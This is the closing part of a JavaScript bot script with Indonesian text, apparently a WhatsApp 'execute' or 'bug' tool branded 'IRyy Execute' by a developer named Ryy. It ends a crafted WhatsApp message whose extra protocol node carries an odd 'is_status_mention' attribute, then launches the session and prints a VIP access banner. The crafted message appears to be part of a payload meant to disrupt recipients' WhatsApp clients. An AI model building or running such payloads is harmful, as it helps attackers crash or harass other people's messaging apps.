            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.red("\nIRyy Execute"));
    console.log(chalk.bold.white("DEVELOPER: Ryy"));
    console.log(chalk.bold.white("VERSION: 5.0"));
    console.log(chalk.bold.white("ACCESS:") + chalk.bold.green(" VIP NO JUAL"));
    console.log(chalk.bold.white("STATUS: ") + chalk.bold.green("ONLINE\n\n"));
    console.log(chalk.bold.yellow("THANKS FOR PENGGUNA SCRIP🎉"));
})();